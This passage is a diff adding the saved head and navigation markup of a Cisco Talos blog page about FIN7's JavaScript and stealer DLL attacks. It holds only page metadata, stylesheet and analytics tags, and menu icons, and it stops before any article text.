@@ -1,0 +1,624 @@
+<!DOCTYPE html>
+<!-- saved from url=(0053)https://blog.talosintelligence.com/fin7-stealer/#more -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <title>FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks</title>
+    <!-- Required meta tags -->
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="./FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks_files/bootstrap.min.css">
+
+    <link rel="stylesheet" href="./FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks_files/navigation.css">
+
+    <link rel="stylesheet" href="./FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks_files/pagination.css">
+
+    <link rel="stylesheet" href="./FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks_files/banners.css">
+
+    <link rel="stylesheet" href="./FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks_files/style.css">
+
+    <link rel="stylesheet" href="./FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks_files/prism.css">
+    <link rel="stylesheet" href="./FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks_files/prism-vsc-dark-plus.css">
+    <link rel="stylesheet" href="./FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks_files/prism-talos.css">
+
+    <link rel="stylesheet" href="./FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks_files/landing-page.css">
+
+    <link rel="preconnect" href="https://fonts.googleapis.com/">
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
+    <link href="./FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks_files/css2" rel="stylesheet">
+    <link href="./FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks_files/css2(1)" rel="stylesheet">
+    <link href="./FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks_files/style.min.css" rel="stylesheet">
+
+
+    <link rel="icon" href="https://blog.talosintelligence.com/content/images/size/w256h256/2022/07/talos_o_square.png" type="image/png">
+    <link rel="canonical" href="https://blog.talosintelligence.com/fin7-stealer/">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    
+    <meta property="og:site_name" content="Cisco Talos Blog">
+    <meta property="og:type" content="article">
+    <meta property="og:title" content="FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks">
+    <meta property="og:description" content="This post was authored by Michael Gorelik and Josh Reynolds
+
+
+
+Executive Summary Throughout this blog post we will be detailing a newly discovered RTF document family that is being leveraged by the FIN7 group (also known as the Carbanak gang) which is a financially-motivated group targeting the financial, hospitality, and">
+    <meta property="og:url" content="https://blog.talosintelligence.com/fin7-stealer/">
+    <meta property="og:image" content="https://blog.talosintelligence.com/content/images/-57GT_WlM2Gg/Wbvg0ZSLJWI/AAAAAAAAAUw/zncYBAG9SY4FCuZHEUqvuRPuuukEvuYlwCLcBGAs/w1200-h630-p-k-no-nu/image17.png">
+    <meta property="article:published_time" content="2017-09-27T17:38:00.000Z">
+    <meta property="article:modified_time" content="2022-08-24T15:20:56.000Z">
+    <meta property="article:tag" content="Threats">
+    
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks">
+    <meta name="twitter:description" content="This post was authored by Michael Gorelik and Josh Reynolds
+
+
+
+Executive Summary Throughout this blog post we will be detailing a newly discovered RTF document family that is being leveraged by the FIN7 group (also known as the Carbanak gang) which is a financially-motivated group targeting the financial, hospitality, and">
+    <meta name="twitter:url" content="https://blog.talosintelligence.com/fin7-stealer/">
+    <meta name="twitter:image" content="https://blog.talosintelligence.com/content/images/-57GT_WlM2Gg/Wbvg0ZSLJWI/AAAAAAAAAUw/zncYBAG9SY4FCuZHEUqvuRPuuukEvuYlwCLcBGAs/w1200-h630-p-k-no-nu/image17.png">
+    <meta name="twitter:label1" content="Written by">
+    <meta name="twitter:data1" content="Edmund Brumaghin">
+    <meta name="twitter:label2" content="Filed under">
+    <meta name="twitter:data2" content="Threats">
+    <meta name="twitter:site" content="@TalosSecurity">
+    <meta property="og:image:width" content="975">
+    <meta property="og:image:height" content="512">
+    
+    <script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "publisher": {
+        "@type": "Organization",
+        "name": "Cisco Talos Blog",
+        "url": "https://blog.talosintelligence.com/",
+        "logo": {
+            "@type": "ImageObject",
+            "url": "https://blog.talosintelligence.com/content/images/2022/11/TalosBrand_ukraine.svg"
+        }
+    },
+    "author": {
+        "@type": "Person",
+        "name": "Edmund Brumaghin",
+        "url": "https://blog.talosintelligence.com/author/edmund-brumaghin/",
+        "sameAs": []
+    },
+    "headline": "FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks",
+    "url": "https://blog.talosintelligence.com/fin7-stealer/",
+    "datePublished": "2017-09-27T17:38:00.000Z",
+    "dateModified": "2022-08-24T15:20:56.000Z",
+    "image": {
+        "@type": "ImageObject",
+        "url": "https://blog.talosintelligence.com/content/images/-57GT_WlM2Gg/Wbvg0ZSLJWI/AAAAAAAAAUw/zncYBAG9SY4FCuZHEUqvuRPuuukEvuYlwCLcBGAs/w1200-h630-p-k-no-nu/image17.png",
+        "width": 975,
+        "height": 512
+    },
+    "keywords": "Threats",
+    "description": "This post was authored by Michael Gorelik and Josh Reynolds\n\n\n\nExecutive Summary Throughout this blog post we will be detailing a newly discovered RTF document family that is being leveraged by the FIN7 group (also known as the Carbanak gang) which is a financially-motivated group targeting the financial, hospitality, and medical industries. This document is used in phishing campaigns to execute a series of scripting languages containing multiple obfuscation mechanisms and advanced techniques to",
+    "mainEntityOfPage": "https://blog.talosintelligence.com/fin7-stealer/"
+}
+    </script>
+
+    <meta name="generator" content="Ghost 5.75">
+    <link rel="alternate" type="application/rss+xml" title="Cisco Talos Blog" href="https://blog.talosintelligence.com/rss/">
+    
+    <script defer="" src="./FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks_files/sodo-search.min.js" data-key="4ffb0139d74ada998f4b141e4d" data-styles="https://cdn.jsdelivr.net/ghost/sodo-search@~1.1/umd/main.css" data-sodo-search="https://cisco-talos-blog.ghost.io/" crossorigin="anonymous"></script>
+    
+    <link href="https://blog.talosintelligence.com/webmentions/receive/" rel="webmention">
+    <script defer="" src="./FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks_files/cards.min.js"></script>
+    <link rel="stylesheet" type="text/css" href="./FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks_files/cards.min.css">
+    <style type="text/css">
+    img[src*="icon_check_white.svg"] { width: 20px; margin-left: 0px; margin-right: auto; }
+    
+    #ghost-portal-root { display: none; }
+</style>
+<!-- Google tag (gtag.js) -->
+<script async="" src="./FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks_files/js"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-F45RVJG3BK');
+</script>
+<style>:root {--ghost-accent-color: #006db6;}</style>
+<style>.App{text-align:center}.App-logo{height:40vmin;pointer-events:none}@media (prefers-reduced-motion: no-preference){.App-logo{animation:App-logo-spin infinite 20s linear}}.App-header{background-color:#282c34;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;font-size:calc(10px + 2vmin);color:#fff}.App-link{color:#61dafb}@keyframes App-logo-spin{0%{transform:rotate(0)}to{transform:rotate(360deg)}}
+</style></head>
+
+<body class="post-template tag-threats tag-hash-blogger">
+
+    <div id="mobile-page-header" class="desktop-hide">
+    <h1>Cisco Talos Blog</h1>
+</div>
+<input id="nav-trigger" class="nav-trigger" type="checkbox">
+<label for="nav-trigger">
+    <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="22px" height="16px" viewBox="0 0 22 16">
+        <g id="menu-icon">
+            <path fill="#FFFFFF" d="M20.5,3h-19C0.672,3,0,2.329,0,1.5S0.672,0,1.5,0h19C21.328,0,22,0.671,22,1.5S21.328,3,20.5,3z"></path>
+            <path fill="#FFFFFF" d="M20.5,9.5h-19C0.672,9.5,0,8.828,0,8c0-0.829,0.672-1.5,1.5-1.5h19C21.328,6.5,22,7.171,22,8   C22,8.828,21.328,9.5,20.5,9.5z"></path>
+            <path fill="#FFFFFF" d="M20.5,16h-19C0.672,16,0,15.328,0,14.5S0.672,13,1.5,13h19c0.828,0,1.5,0.672,1.5,1.5S21.328,16,20.5,16z"></path>
+        </g>
+    </svg>
+</label>
+<nav id="nav">
+    <div id="top-nav-bar">
+    </div>
+
+    <div id="navigation">
+        <div class="navigation-logos-wrapper">
+            <div id="talos-logo-wrapper">
+                <a class="navbar-brand" href="https://talosintelligence.com/">
+                </a>
+            </div>
+        </div>
+        <div class="navigation-links-wrapper">
+            <ul class="main-nav-list">
+                <li class="nav-item">
+                    <a class="primary_nav_link" href="https://talosintelligence.com/software">
+                        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" id="Layer_1" x="0px" y="0px" viewBox="0 0 20 20" style="enable-background:new 0 0 20 20;" xml:space="preserve">
+                            <style type="text/css">
+                                .white{fill:#FFFFFF;}
+                            </style>
+                            <path class="white" d="M19.4,17.1c0,0.1-0.1,0-0.2,0c0,0-1.3-0.9-2-1.4c-0.2-0.1-0.5-0.1-0.6,0.1c-0.3,0.3-0.6,0.8-0.9,1.3  c-0.1,0.2-0.1,0.5,0.1,0.6l2,1.5c0.1,0,0,0.1,0.1,0.2c0,0.1,0,0.1-0.1,0.2c-1.2,0.5-2.6,0.2-3.5-0.7c-0.8-0.9-1-2-0.7-3.1L4.5,6.5  c-1,0.3-2.3,0-3-0.9c-0.8-0.9-1.1-1.7-1-2.7c0-0.1,0-0.1,0.1-0.2c0.1,0,0.2,0.1,0.2,0.1l2,1.5C3,4.4,3.3,4.5,3.4,4.2  c0,0,0.5-0.8,0.9-1.3c0.1-0.2,0.1-0.5-0.1-0.6L2.3,0.9c-0.1,0,0-0.1-0.1-0.3c0-0.1,0-0.1,0.1-0.2C3.5-0.1,5,0.2,5.8,1.1  c0.8,0.9,1,2,0.7,3.1l9.1,9.3c1-0.3,2.3,0,3,0.9c0.7,0.7,0.9,1.5,0.9,2.5C19.5,16.9,19.5,17,19.4,17.1z"></path>
+                        </svg>
+                        <span>Software</span>
+                    </a>
+                </li>
+                <li class="nav-item">
+                    <div class="primary-link-wrapper">
+                        <a class="primary_nav_link" href="https://talosintelligence.com/vulnerability_info">
+                            <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="26px" height="20px" viewBox="0 0 26 20">
+                                <g id="vuln-icon" class="nav-icon">
+                                    <path fill="#FFFFFF" d="M24.256,18.49L13.872,0.503C13.692,0.192,13.36,0,13,0c-0.359,0-0.692,0.192-0.872,0.503L1.744,18.49  c-0.18,0.312-0.18,0.695,0,1.006C1.924,19.809,2.257,20,2.616,20h20.769c0.359,0,0.691-0.191,0.871-0.504  C24.436,19.186,24.436,18.803,24.256,18.49 M14.268,18.215h-2.533v-1.85h2.533V18.215z M14.268,15.441h-2.533L10.89,6.515h4.222  L14.268,15.441z"></path>
+                                </g>
+                            </svg>
+                            <span>Vulnerability Information</span>
+                        </a>
+                    </div>
+                    <input class="sub-nav-trigger" id="vuln-sub-trigger" type="checkbox">
+                    <label class="sub-nav-trigger-label" for="vuln-sub-trigger">
+                        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="48.167px" height="47.75px" viewBox="0 0 48.167 47.75">
+                            <circle opacity="0.4" fill="none" stroke="#FFFFFF" stroke-miterlimit="10" cx="24.083" cy="23.875" r="22"></circle>
+                            <g>
+                                <circle fill="#FFFFFF" cx="24.083" cy="16.068" r="2.496"></circle>
+                                <circle fill="#FFFFFF" cx="24.083" cy="23.875" r="2.496"></circle>
+                                <circle fill="#FFFFFF" cx="24.083" cy="31.682" r="2.496"></circle>
+                            </g>
+                        </svg>
+                    </label>
+                    <ul class="sub-nav">
+                        <li class="desktop-hide">
+                            <a href="https://talosintelligence.com/vulnerability_info">
+                                <h4>Vulnerability Information</h4>
+                            </a>
+                        </li>
+                        <li class="desktop-hide">
+                            <label class="subnav-back-button" for="vuln-sub-trigger">BACK</label>
+                        </li>
+                        <li><a href="https://talosintelligence.com/vulnerability_reports">Vulnerability Reports</a></li>
+                        <li><a href="https://talosintelligence.com/ms_advisories">Microsoft Advisories</a></li>
+                    </ul>
+                    <div class="desktop-hide subnav-overlay">
+                        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="26px" height="20px" viewBox="0 0 26 20">
+                            <g id="vuln-icon" class="nav-icon">
+                                <path fill="#FFFFFF" d="M24.256,18.49L13.872,0.503C13.692,0.192,13.36,0,13,0c-0.359,0-0.692,0.192-0.872,0.503L1.744,18.49  c-0.18,0.312-0.18,0.695,0,1.006C1.924,19.809,2.257,20,2.616,20h20.769c0.359,0,0.691-0.191,0.871-0.504  C24.436,19.186,24.436,18.803,24.256,18.49 M14.268,18.215h-2.533v-1.85h2.533V18.215z M14.268,15.441h-2.533L10.89,6.515h4.222  L14.268,15.441z"></path>
+                            </g>
+                        </svg>
+                    </div>
+                </li>
+                <li class="nav-item">
+                    <div class="primary-link-wrapper">
+                        <a class="primary_nav_link" href="https://talosintelligence.com/reputation">
+                            <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" id="Layer_1" x="0px" y="0px" viewBox="0 0 20 20" height="20px" width="20px" style="enable-background:new 0 0 20 20;" xml:space="preserve">
+                                <style type="text/css">
+                                    .white{fill:#FFFFFF;}
+                                </style>
+                                <g>
+                                <path class="white" d="M19.5,9.5h-1.1c-0.3-4.2-3.6-7.6-7.8-7.8V0.5C10.5,0.2,10.3,0,10,0l0,0C9.7,0,9.5,0.2,9.5,0.5l0,0v1.1   C5.3,1.9,1.9,5.3,1.6,9.5H0.5C0.2,9.5,0,9.7,0,10s0.2,0.5,0.5,0.5l0,0h1.1c0.3,4.2,3.6,7.6,7.8,7.8v1.1c0,0.3,0.2,0.5,0.5,0.5l0,0   c0.3,0,0.5-0.2,0.5-0.5l0,0v-1.1c4.2-0.3,7.6-3.6,7.8-7.8h1.1c0.3,0,0.5-0.2,0.5-0.5C20,9.7,19.8,9.5,19.5,9.5 M16.6,10.5h0.7   c-0.3,3.6-3.2,6.5-6.8,6.8v-0.8c0-0.3-0.2-0.5-0.5-0.5l0,0c-0.3,0-0.5,0.2-0.5,0.5v0.8C5.8,17,3,14.2,2.7,10.5h0.8   C3.8,10.5,4,10.3,4,10S3.8,9.5,3.5,9.5l0,0H2.7C3,5.8,5.8,3,9.5,2.7v0.8C9.5,3.7,9.7,4,10,4l0,0c0.3,0,0.5-0.2,0.5-0.5V2.7   C14.2,3,17,5.8,17.3,9.5h-0.7c-0.3,0-0.5,0.2-0.5,0.5C16.1,10.3,16.3,10.5,16.6,10.5L16.6,10.5"></path>
+                                    <circle class="white" cx="10" cy="10" r="3.2"></circle>
+                                </g>
+                            </svg>
+                            <span>
+                                Reputation Center
+                            </span>
+                        </a>
+                    </div>
+                    <input class="sub-nav-trigger" id="reputation-sub-trigger" type="checkbox">
+                    <label class="sub-nav-trigger-label" for="reputation-sub-trigger">
+                        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="48.167px" height="47.75px" viewBox="0 0 48.167 47.75">
+                            <circle opacity="0.4" fill="none" stroke="#FFFFFF" stroke-miterlimit="10" cx="24.083" cy="23.875" r="22"></circle>
+                            <g>
+                                <circle fill="#FFFFFF" cx="24.083" cy="16.068" r="2.496"></circle>
+                                <circle fill="#FFFFFF" cx="24.083" cy="23.875" r="2.496"></circle>
+                                <circle fill="#FFFFFF" cx="24.083" cy="31.682" r="2.496"></circle>
+                            </g>
+                        </svg>
+                    </label>
+                    <ul class="sub-nav">
+                        <li class="desktop-hide">
+                            <a href="https://talosintelligence.com/reputation">
+                                <h4>Reputation Center</h4>
+                            </a>
+                        </li>
+                        <li class="desktop-hide">
+                            <label class="subnav-back-button" for="reputation-sub-trigger">BACK</label>
+                        </li>
+                        <li><a data-method="get" href="https://talosintelligence.com/reputation_center">IP &amp; Domain Reputation</a></li>
+                        <li><a href="https://talosintelligence.com/talos_file_reputation">Talos File Reputation</a></li>
+                        <li><a href="https://talosintelligence.com/amp-naming">Secure Endpoint Naming Conventions</a></li>
+                        <li><a href="https://talosintelligence.com/categories">Intelligence Categories</a></li>
+                    </ul>
+                    <div class="desktop-hide subnav-overlay">
+                        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" id="Layer_1" x="0px" y="0px" viewBox="0 0 20 20" height="20px" width="20px" style="enable-background:new 0 0 20 20;" xml:space="preserve">
+                            <style type="text/css">
+                                .white{fill:#FFFFFF;}
+                            </style>
+                            <g>
+                            <path class="white" d="M19.5,9.5h-1.1c-0.3-4.2-3.6-7.6-7.8-7.8V0.5C10.5,0.2,10.3,0,10,0l0,0C9.7,0,9.5,0.2,9.5,0.5l0,0v1.1   C5.3,1.9,1.9,5.3,1.6,9.5H0.5C0.2,9.5,0,9.7,0,10s0.2,0.5,0.5,0.5l0,0h1.1c0.3,4.2,3.6,7.6,7.8,7.8v1.1c0,0.3,0.2,0.5,0.5,0.5l0,0   c0.3,0,0.5-0.2,0.5-0.5l0,0v-1.1c4.2-0.3,7.6-3.6,7.8-7.8h1.1c0.3,0,0.5-0.2,0.5-0.5C20,9.7,19.8,9.5,19.5,9.5 M16.6,10.5h0.7   c-0.3,3.6-3.2,6.5-6.8,6.8v-0.8c0-0.3-0.2-0.5-0.5-0.5l0,0c-0.3,0-0.5,0.2-0.5,0.5v0.8C5.8,17,3,14.2,2.7,10.5h0.8   C3.8,10.5,4,10.3,4,10S3.8,9.5,3.5,9.5l0,0H2.7C3,5.8,5.8,3,9.5,2.7v0.8C9.5,3.7,9.7,4,10,4l0,0c0.3,0,0.5-0.2,0.5-0.5V2.7   C14.2,3,17,5.8,17.3,9.5h-0.7c-0.3,0-0.5,0.2-0.5,0.5C16.1,10.3,16.3,10.5,16.6,10.5L16.6,10.5"></path>
+                                <circle class="white" cx="10" cy="10" r="3.2"></circle>
+                            </g>
+                        </svg>
+                    </div>
+                </li>
+                <li class="nav-item">
+                    <a class="primary_nav_link" href="https://support.talosintelligence.com/">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="26px" height="20px" viewBox="0 0 123.17 159.292">
+                            <path d="M61.59,0,0,17.069v85.32c0,23.472,61.59,56.9,61.59,56.9s61.58-36.288,61.58-56.9V17.069Zm-.433,149.746C38.314,136.662,8.128,114.3,8.128,102.389V23.239l53.029-14.7Z" fill="#fff"></path>
+                        </svg>
+                        <span>Support</span>
+                    </a>
+                </li>
+                <li class="nav-item">
+                    <a class="primary_nav_link" href="https://talosintelligence.com/incident_response">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="111.588" height="148.311" viewBox="0 0 111.588 148.311">
+                            <path d="M1.181,128.446v15.7a4.167,4.167,0,0,0,4.167,4.167h100.9a4.167,4.167,0,0,0,4.167-4.167v-15.7a4.167,4.167,0,0,0-4.167-4.167H5.348a4.167,4.167,0,0,0-4.167,4.166M55.8,63.109a3.277,3.277,0,1,1,0,6.553c-10.344,0-20.755,8.578-20.755,18.57a3.277,3.277,0,1,1-6.554,0C28.489,73.947,41.93,63.109,55.8,63.109Zm0-12.016c-21.787,0-39.325,17.81-39.325,39.937v26.7H95.122V91.03c0-22.128-17.537-39.937-39.324-39.937m52.365-38.3a3.291,3.291,0,0,0-2.254,1.024L88.432,31.294a3.283,3.283,0,0,0,4.642,4.644l17.478-17.479a3.278,3.278,0,0,0-2.389-5.666m-105.138,0a3.276,3.276,0,0,0-1.98,5.666L18.522,35.938a3.283,3.283,0,0,0,4.643-4.644L5.687,13.817A3.255,3.255,0,0,0,3.025,12.793ZM55.389.026a3.276,3.276,0,0,0-2.867,3.345V19.642a3.277,3.277,0,1,0,6.554,0V3.371A3.283,3.283,0,0,0,55.389.026Z" fill="#fff"></path>
+                        </svg>
+                        <span>Incident Response</span>
+                    </a>
+                </li>
+
+                <li class="nav-item">
+                    <a class="primary_nav_link" href="https://talosintelligence.com/careers">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="153.816" height="90" viewBox="0 0 153.816 90">
+                            <g>
+                                <path d="M56.336,47.451a31.328,31.328,0,0,0-17.1-10.872A19.564,19.564,0,0,0,50.91,19.1C50.91,8.868,42.008,0,31.735,0S12.559,8.868,12.559,19.1A19.564,19.564,0,0,0,24.22,36.574,31.239,31.239,0,0,0,0,66.717c0,2.343,12.671,10.9,31.883,10.9a63.142,63.142,0,0,0,6.536-.341,37,37,0,0,1,8.222-21.367,38.039,38.039,0,0,1,9.7-8.456" fill="#fff" fill-rule="evenodd"></path>
+                                <path d="M106.731,70.729a32.386,32.386,0,0,0-1.889-4.815c-.014-.029-.028-.058-.043-.087a32.308,32.308,0,0,0-2.568-4.335c-.033-.047-.066-.095-.1-.142-.312-.436-.631-.866-.964-1.287l-.015-.02a32.215,32.215,0,0,0-2.185-2.483l-.166-.168c-.369-.372-.745-.737-1.131-1.09l-.025-.024c-.415-.379-.838-.744-1.272-1.1l-.081-.064q-.582-.474-1.189-.92l-.217-.159c-.43-.312-.866-.616-1.313-.9h0a31.084,31.084,0,0,0-9.679-4.164A19.564,19.564,0,0,0,95.566,31.488c0-10.234-8.9-19.1-19.175-19.1s-19.176,8.868-19.176,19.1A19.564,19.564,0,0,0,68.876,48.96a31.828,31.828,0,0,0-9.109,3.733h0a31.8,31.8,0,0,0-6.941,5.668l-.045.05a31.3,31.3,0,0,0-2.243,2.738l-.024.034q-.5.693-.969,1.415c-.014.023-.03.047-.046.07a31.053,31.053,0,0,0-1.7,3.019c-.028.059-.057.117-.085.175a30.16,30.16,0,0,0-1.33,3.185c-.02.056-.038.112-.058.169q-.255.741-.474,1.5c-.019.065-.039.13-.057.2a30.092,30.092,0,0,0-.741,3.374c-.015.094-.03.188-.044.282-.084.56-.158,1.123-.211,1.693v.007c-.087.935-.135,1.88-.135,2.834,0,2.343,12.671,10.9,31.883,10.9s31.583-8.555,31.583-10.9a32.8,32.8,0,0,0-1.384-8.35l-.007-.023" fill="#fff" fill-rule="evenodd"></path>
+                                <path d="M129.588,36.579A19.564,19.564,0,0,0,141.261,19.1c0-10.234-8.9-19.1-19.175-19.1S102.91,8.868,102.91,19.1a19.562,19.562,0,0,0,11.66,17.472A31.817,31.817,0,0,0,96.916,47.859a38.586,38.586,0,0,1,17.373,29.253,63.062,63.062,0,0,0,7.945.5c19.212,0,31.582-8.554,31.582-10.9a31.947,31.947,0,0,0-24.228-30.138" fill="#fff" fill-rule="evenodd"></path>
+                            </g>
+                        </svg>
+                        <span>Careers</span>
+                    </a>
+                </li>
+
+                <li class="nav-item">
+                    <div class="primary-link-wrapper">
+                        <a id="link_blog" class="primary_nav_link" href="https://blog.talosintelligence.com/">
+                            <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" id="Layer_1" x="0px" y="0px" width="260px" height="296.5px" viewBox="0 0 260 296.5" enable-background="new 0 0 260 296.5" xml:space="preserve">
+                                <path fill="#FFFFFF" d="M243.586,42.404h-14.448c-0.943-4.513-3.143-8.813-6.616-12.33L201.793,9.098  c-4.7-4.757-10.972-7.377-17.66-7.377c-6.578,0-12.777,2.547-17.457,7.173l-33.875,33.511H17.586c-6.6,0-12,5.399-12,12V226.28  c0,6.6,5.4,12,12,12H153.83l84.21,56.278l-27.448-56.278h32.994c6.6,0,12-5.4,12-12V54.404  C255.586,47.804,250.186,42.404,243.586,42.404z M214.662,48.045c-0.01,0.2-0.021,0.399-0.044,0.599  c-0.008,0.069-0.021,0.139-0.031,0.207c-0.046,0.345-0.113,0.688-0.196,1.026c-0.034,0.137-0.063,0.273-0.103,0.408  c-0.039,0.135-0.087,0.267-0.133,0.399c-0.051,0.151-0.102,0.302-0.16,0.45c-0.049,0.126-0.105,0.249-0.16,0.373  c-0.068,0.153-0.139,0.307-0.216,0.457c-0.059,0.116-0.12,0.23-0.184,0.345c-0.088,0.157-0.181,0.312-0.278,0.465  c-0.065,0.104-0.13,0.206-0.2,0.308c-0.115,0.168-0.239,0.33-0.366,0.492c-0.064,0.081-0.124,0.165-0.19,0.244  c-0.199,0.238-0.409,0.472-0.635,0.694L82.458,182.308l-47.932,12.871l13.427-47.74L177.223,19.561  c1.917-1.895,4.414-2.84,6.911-2.84c2.534,0,5.068,0.975,6.99,2.92l20.726,20.974c0.545,0.552,1.002,1.156,1.39,1.79  c0.574,0.938,0.975,1.951,1.206,2.993c0.004,0.021,0.01,0.04,0.014,0.06c0.049,0.226,0.086,0.453,0.119,0.682  c0.008,0.06,0.017,0.118,0.024,0.178c0.026,0.211,0.045,0.424,0.058,0.636c0.004,0.077,0.007,0.153,0.009,0.23  c0.007,0.203,0.011,0.407,0.005,0.61C214.673,47.877,214.666,47.961,214.662,48.045z"></path>
+                            </svg>
+                            <span>Blog</span>
+                        </a>
+                    </div>
+                    <input id="blog-sub-trigger" class="sub-nav-trigger" type="checkbox">
+                    <label class="sub-nav-trigger-label" for="blog-sub-trigger">
+                        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="48.167px" height="47.75px" viewBox="0 0 48.167 47.75">
+                            <circle opacity="0.4" fill="none" stroke="#FFFFFF" stroke-miterlimit="10" cx="24.083" cy="23.875" r="22"></circle>
+                            <g>
+                                <circle fill="#FFFFFF" cx="24.083" cy="16.068" r="2.496"></circle>
+                                <circle fill="#FFFFFF" cx="24.083" cy="23.875" r="2.496"></circle>
+                                <circle fill="#FFFFFF" cx="24.083" cy="31.682" r="2.496"></circle>
+                            </g>
+                        </svg>
+                    </label>
+                    <ul class="sub-nav">
+                        <li class="desktop-hide">
+                            <a href="https://blog.talosintelligence.com/">
+                                <h4>Blog</h4>
+                            </a>
+                        </li>
+                        <li class="desktop-hide">
+                            <label class="subnav-back-button" for="blog-sub-trigger">BACK</label>
+                        </li>
+                        <li>
+                            <a href="https://blog.talosintelligence.com/">Talos Blog</a>
+                        </li>
+                        <li>
+                            <a href="https://blog.talosintelligence.com/category/threat-source-newsletter/">Talos Threat Source Newsletter</a>
+                        </li>
+                    </ul>
+                    <div class="desktop-hide subnav-overlay">
+                        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" id="Layer_1" x="0px" y="0px" width="20px" height="20px" viewBox="0 0 260 296.5" enable-background="new 0 0 260 296.5" xml:space="preserve">
+                            <path fill="#FFFFFF" d="M243.586,42.404h-14.448c-0.943-4.513-3.143-8.813-6.616-12.33L201.793,9.098  c-4.7-4.757-10.972-7.377-17.66-7.377c-6.578,0-12.777,2.547-17.457,7.173l-33.875,33.511H17.586c-6.6,0-12,5.399-12,12V226.28  c0,6.6,5.4,12,12,12H153.83l84.21,56.278l-27.448-56.278h32.994c6.6,0,12-5.4,12-12V54.404  C255.586,47.804,250.186,42.404,243.586,42.404z M214.662,48.045c-0.01,0.2-0.021,0.399-0.044,0.599  c-0.008,0.069-0.021,0.139-0.031,0.207c-0.046,0.345-0.113,0.688-0.196,1.026c-0.034,0.137-0.063,0.273-0.103,0.408  c-0.039,0.135-0.087,0.267-0.133,0.399c-0.051,0.151-0.102,0.302-0.16,0.45c-0.049,0.126-0.105,0.249-0.16,0.373  c-0.068,0.153-0.139,0.307-0.216,0.457c-0.059,0.116-0.12,0.23-0.184,0.345c-0.088,0.157-0.181,0.312-0.278,0.465  c-0.065,0.104-0.13,0.206-0.2,0.308c-0.115,0.168-0.239,0.33-0.366,0.492c-0.064,0.081-0.124,0.165-0.19,0.244  c-0.199,0.238-0.409,0.472-0.635,0.694L82.458,182.308l-47.932,12.871l13.427-47.74L177.223,19.561  c1.917-1.895,4.414-2.84,6.911-2.84c2.534,0,5.068,0.975,6.99,2.92l20.726,20.974c0.545,0.552,1.002,1.156,1.39,1.79  c0.574,0.938,0.975,1.951,1.206,2.993c0.004,0.021,0.01,0.04,0.014,0.06c0.049,0.226,0.086,0.453,0.119,0.682  c0.008,0.06,0.017,0.118,0.024,0.178c0.026,0.211,0.045,0.424,0.058,0.636c0.004,0.077,0.007,0.153,0.009,0.23  c0.007,0.203,0.011,0.407,0.005,0.61C214.673,47.877,214.666,47.961,214.662,48.045z"></path>
+                        </svg>
+
+                    </div>
+                </li>
+
+                <li class="nav-item">
+                    <div class="primary-link-wrapper">
+                        <a class="primary_nav_link" href="https://talosintelligence.com/podcasts">
+                            <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" id="podcast-icon-nav" x="0px" y="0px" viewBox="0 0 71.8 75" width="26px" height="20px" style="enable-background:new 0 0 71.8 75;" xml:space="preserve">
+                                <style type="text/css">
+                                    .podcast-fill{fill:#fff;}
+                                </style>
